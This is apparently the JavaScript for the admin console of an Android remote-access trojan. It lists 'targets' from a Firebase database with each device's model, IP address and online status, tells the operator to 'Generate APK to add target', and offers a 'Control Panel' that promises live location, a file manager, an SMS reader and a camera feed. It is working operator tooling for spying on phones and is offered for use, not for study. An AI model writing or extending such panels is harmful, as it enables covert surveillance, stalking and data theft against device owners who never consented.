const adminApp = {
    init: function() {
        this.loadTargets();
        // Refresh every 5 seconds for Real-time feel
        setInterval(() => this.loadTargets(), 5000);
    },

    loadTargets: async function() {
        const grid = document.getElementById('targetsGrid');
        const totalEl = document.getElementById('totalTargets');
        const activeEl = document.getElementById('activeDevices');
        const countTotal = document.getElementById('countTotal');
        const countOnline = document.getElementById('countOnline');

        try {
            // Fetch all documents from 'targets' collection
            const querySnapshot = await db.collection("targets").orderBy("createdAt", "desc").get();
            
            let html = '';
            let count = 0;
            let onlineCount = 0;

            if (querySnapshot.empty) {
                html = '<p style="grid-column: 1/-1; text-align:center;">No targets found. Generate APK to add target.</p>';
            } else {
                querySnapshot.forEach((doc) => {
                    const data = doc.data();
                    count++;
                    
                    // Simple logic: If last seen within 2 mins, consider online
                    const lastSeenDate = new Date(data.lastSeen);
                    const now = new Date();
                    const diffMins = Math.floor((now - lastSeenDate) / 60000);
                    const isOnline = diffMins < 2;
                    
                    if(isOnline) onlineCount++;

                    html += `
                        <div class="target-card">
                            <h3>📱 ${data.apkName || 'Unknown'}</h3>
                            <div class="target-info"><strong>Model:</strong> ${data.model}</div>
                            <div class="target-info"><strong>IP:</strong> ${data.ip}</div>
                            <div class="target-info"><strong>Status:</strong> <span style="color:${isOnline ? '#4CAF50' : '#ff9800'}">${isOnline ? '🟢 Online' : '🟡 Offline'}</span></div>
                            <div class="target-info"><strong>Last Seen:</strong> ${diffMins} mins ago</div>
                            <button class="btn-control" onclick="adminApp.viewDetails('${doc.id}')">🎮 Control Panel</button>
                        </div>
                    `;
                });
            }

            grid.innerHTML = html;
            totalEl.innerText = `${count} Targets`;
            activeEl.innerText = `${onlineCount} Active`;
            countTotal.innerText = count;
            countOnline.innerText = onlineCount;

        } catch (error) {
            console.error("Error loading targets:", error);
            document.getElementById('targetsGrid').innerHTML = '<p>Error connecting to database.</p>';
        }
    },

    viewDetails: function(docId) {
        // In a full app, this would redirect to controls.html?id=docId
        alert(`Opening Full Control Interface for Device ID: ${docId}\n\nFeatures:\n- Live Location Map\n- File Manager\n- SMS Reader\n- Camera Feed`);
    }
};

// Start the admin panel logic when page loads
document.addEventListener('DOMContentLoaded', () => {
    adminApp.init();
});
